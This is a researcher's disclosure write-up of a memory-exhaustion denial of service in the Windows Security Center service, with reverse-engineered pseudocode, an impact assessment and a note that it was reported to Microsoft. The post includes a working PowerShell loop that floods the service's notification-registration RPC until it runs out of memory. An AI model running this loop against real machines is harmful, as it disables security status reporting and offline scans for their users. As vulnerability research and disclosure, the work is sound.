---
layout: post
title: "Windows Security Center (WSC) DoS"
date: 2025-02-15
categories: [Security, Vulnerabilities, Windows]
tags: [DoS, Windows Security Center, Vulnerability]
published: true
---

This post examines a denial of service, by way of memory exhaustion,
vulnerability in the Microsoft Windows Security Center. The attack leads to
noticeable degradation in a couple of user-facing security features, including
status reporting of antimalware and firewall products and the ability to start
an on-demand scan.

## Table of Contents

1. [Overview](#overview)
2. [Vulnerability Details](#vulnerability-details)
    * [Pseudocode of relevant functions](#pseudocode-of-relevant-functions)
    * [Analysis](#analysis)
3. [Exploitation](#exploitation)
    * [Impact](#impact)
4. [Conclusion](#conclusion)

# Overview

While poking around at on-by-default ALPC services in Microsoft Windows 11, I
noticed that the Windows Security Center service (WSCSVC) is vulnerable to a
denial of service attack. The service is responsible for monitoring the status
of various security products on the system, as well as handling events like the
registration of new security products. A subsystem for enabling processes to
subscribe to events ends up permitting unprivileged users to allocate unbounded
amounts of memory, resulting in a denial of service condition. I've confirmed
that this issue is present in Windows 11 Home since at least build 10.0.22631,
but it may be present in earlier versions as well. The issue was initially
reported to Microsoft on 30 July 2024 (MSRC Case 89963) and was closed as a
moderate severity issue on 20 August 2024.

The WSCSVC service is implemented by `C:\Windows\System32\wscsvc.dll`, and runs
as the Local Service account. It is an Anti-Malware Protected Process Light
(AMPPL), which means it is protected from tampering by any process not signed
by Microsoft or another trusted antimalware product provider.

# Vulnerability Details

The vulnerability is a DoS by memory exhaustion attack, where an unprivileged
user can cause the WSCSVC service to allocate memory until the system runs out
of resources. The attack is triggered by sending a large number of event
subscription requests to the service, which are added to an unbounded list
of subscriptions. The RPC interface for event subscription does not require
that the source be an anti-malware product like many of the other WSC APIs do,
so any local user can trigger the vulnerability.

Specifically, the vulnerable function is `s_wscRegisterChangeNotification`.
This RPC is designed to let processes use Event objects to be notified when
new security products are registered or unregistered with Windows Security
Center. Symbols are available for `wscsvc.dll` on the public Windows Symbol
Server, so you can find the function by name.

## Pseudocode of relevant functions

The pseudocode for the RPC handler function, as manually determined by me and
edited for simplicity:

```cpp
DWORD s_wscRegisterChangeNotification(void *arg1,
    HANDLE hEventIn,
    void *arg3,
    int bNotifyOnRegister,
    unsigned long long **rpcOut) {
) {
    if (g_State.Trace) {
        DoEtwTrace(TRACE_GUID);
    }
    if (EventHandle == NULL) {
        return 0x59;
    }

    HANDLE myHandle;
    int result = DuplicateHandle(GetCurrentProcess(), hEventIn,
                                 GetCurrentProcess(), myHandle, 0, 0, 2);

    if (result == 0) {
        return GetLastError();
    }

    int registerResult = RegisterChangeNotification(
                            GetCurrentProcess(), myHandle, rpcOut);
    
    if (registerResult < 0) {
        if (g_State.Trace) {
            DoEtwTrace(TRACE_GUID);
        }
        CloseHandle(myHandle);
    } else {
        if (bNotifyOnRegister != 0 &&
            g_pThirdPartyMonitoring != NULL &&
            g_pThirdPartyMonitoring->Notifications != NULL && 
            g_pThirdPartyMonitoring->Notifications->Event != NULL) {

            SetEvent(g_pThirdPartyMonitoring->Notifications->Event);
    }

    return registerResult;
}
```

The mangled name for `RegisterChangeNotification` is
`?RegisterNotification@CAlertStatus@@QEAAJPEAXPEAPEAU_CListElement@@@Z`

Pseudocode for that function is: 

```cpp
CList g_pAlertStatus<HANDLE, HANDLE &>;

WORD RegisterChangeNotification(
    HANDLE hCurrentProccess, HANDLE hEventIn, unsigned long long **rpcOut) {
    if (HANDLE <= 0 || hEventOut == NULL) {
        if (g_State.Trace) {
            DoEtwTrace(TRACE_GUID);
        }
        // E_INVALIDARG
        return 0x80070057;
    }

    // 8-byte alloc, since HANDLE is a full QWORD (on 64 bit CPUs)
    std::allocator<HANDLE> listItem;
    if (listItem == NULL) {
        // E_OUTOFMEMORY
        return 0x8007000E;
    }
    *listItem = hEventIn;

    int insertedPosition = g_pAlertStatus.AddTail(newElement);
    if (insertedPosition == 0) {
        if (g_State.Trace) {
            DoEtwTrace(TRACE_GUID);
        }

        delete listItem;
        // E_OUTOFMEMORY
        return 0x8007000E;
    }
    
    *rpcOut = insertedPosition;
    return 0; 
}
```

When relevant WSC events occur, methods in the `CAlertStatus` namespace get
called to iterate over the linked list and signal the events using `SetEvent`.
While some of these methods remove items from the list and free the memory
backing them, some do not. For example, when the Internet Connection Firewall
(ICF) is enabled via the `s_wscIcfEnable` RPC, the `FireNotificationEvents`
method (`?FireNotificationEvents@CAlertStatus@@QEAAXH@Z`) simply loops over
the linked list and signals the events without removing the items.
Psuedocode:

```cpp
CList g_pAlertStatus<HANDLE, HANDLE &>;

void FireNotificationEvents(
    CList<HANDLE, HANDLE &> *alertList, int unknown) {
    int i = 0;
    HANDLE hEvent = -1;
    for (i = 0; hEvent != NULL; i++) {
        hEvent = alertList->GetNext(i);
        if (hEvent != NULL) {
            SetEvent(hEvent);
        }
    }
}
```

## Analysis

Given what we know about the input method (`s_wscRegisterChangeNotification`)
and the linked list insertion method (`RegisterChangeNotification`), we can
effectively allocate arbitrary amounts of memory 8 bytes at a time. We also
know that the memory is only freed when certain events are triggered. As a
bonus, because this service runs as a protected process, system users and
administrators will be unable to restart the process or service to free the
memory manually.

# Exploitation

Using powershell to call the RPC method in a simple loop, we can wait and see
what starts going wrong when the process runs out of memory.

```powershell
Set-GlobalSymbolResolver -DbgHelpPath 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\dbghelp.dll'

$wscServer = Get-RpcServer C:\Windows\System32\wscsvc.dll
$wscClient = Get-RpcClient $wscServer

$rpcEndpoint = (Get-RpcEndpoint | Where-Object -Property Annotation -Eq 'Security Center')[1]

Connect-RpcClient -Client $wscClient -EndpointPath $rpcEndpoint.Endpoint -ProtocolSequence ncalrpc

$event = New-NtEvent -Inherit
$ErrorActionPreference = "SilentlyContinue"
# Method is also ServiceMain_1. We have symbols so we might as well use them
while($true) {$wscClient.s_wscRegisterChangeNotification($event, 1, 0) |Out-Null}
```

Watching it run, it looks like 3 instances of that script result in a memory
growth of about 2MB per second. Extrapolating from that, I should be able to
fill up the memory of my 8GB VM (started with 6GB free) in about 1 hour. If
I were more motivated, I could probably write something in C++ that would be
able to get higher memory growth rates.

## Impact

After letting that script run for an hour on a VM with 8GB of RAM, the
requests start to fail with an out of memory error. The system is noticably
slower when responding to input, but because it's a VM that could be due to
other factors outside of the Windows operating system. Task Manager confirms
that the Security Center service has a drastically increased memory usage of
1.7 GB.

The most obvious impact is that the Windows Security Center will no longer
consistently respond to legitimate RPC requests. That's mostly fine, as the
actual performance of antimalware and firewall services are done by other 
services. The majority of WSC RPCs are only needed when a new security product
is installed or uninstalled, and I don't think preventing new security products
from being registered is a very valuable primitive to attackers. What could be
of interest is that the WSC service is also responsible for coordinating
updates to antimalware products, so by keeping the service offline a system
could be left with outdated signature definitions.

Along the same lines, the RPC server being unavailable will prevent Windows
Defender users from manually starting offline scans, as WSC is responsible for
pulling down definitions and initiating the scan. That could be useful, since a
system administrator trying to figure out why the system is sitting at 100%
memory utilization may try to run such a scan. I don't think it's a critical
feature.

Below is an image of the error recorded when a user tries to start an offline
scan while the DoS condition is met.

![Windows Event Viewer displaying an out-of-memory error when trying to download and configure Microsoft Defender Antivirus](/images/wsc/offline_scan_error.png)


A user-visible impact is that the Windows Security Center will no longer
display accurate protection information. The status of the firewall and
antivirus products default to "None," and while this is not itself useful to an
attacker it could be used as part of a ruse to get the user to install a fake
security product.


<div style="display: flex; justify-content: space-around;">
    <figure>
        <figcaption>Before DoS Attack</figcaption>
        <img src="/images/wsc/before_dos_protection.png" width="250" height="250" alt="Before DoS Attack" />
    </figure>
    <figure>
        <figure>
            <figcaption>After DoS Attack</figcaption>
            <div style="width: 250px; height: 250px; display: flex; align-items: center; justify-content: center;">
                <img src="/images/wsc/no_protection.png" width="250" height="250" alt="After DoS Attack" />
            </div>
        </figure>
    </figure>
</div>


# Conclusion

This denial of service issue was interesting to identify and explore, but I
agree with Microsoft's classification of it as a moderate severity issue. The
vulnerability is not remotely exploitable, and the impact is limited to
somewhat unpredictable denial of service against antivirus "management"
features, while the normal operation of the antivirus/firewall is not affected.
It may be useful as part of a larger attack chain, as it can be used to get
arbitrary data into the heap of the WSC service process.

It's possible that similar issues exist in other ALPC services, and I plan to
continue looking for them. Maybe one of those services will have a more severe
impact to the system if it can be manipulated into running itself out of memory.
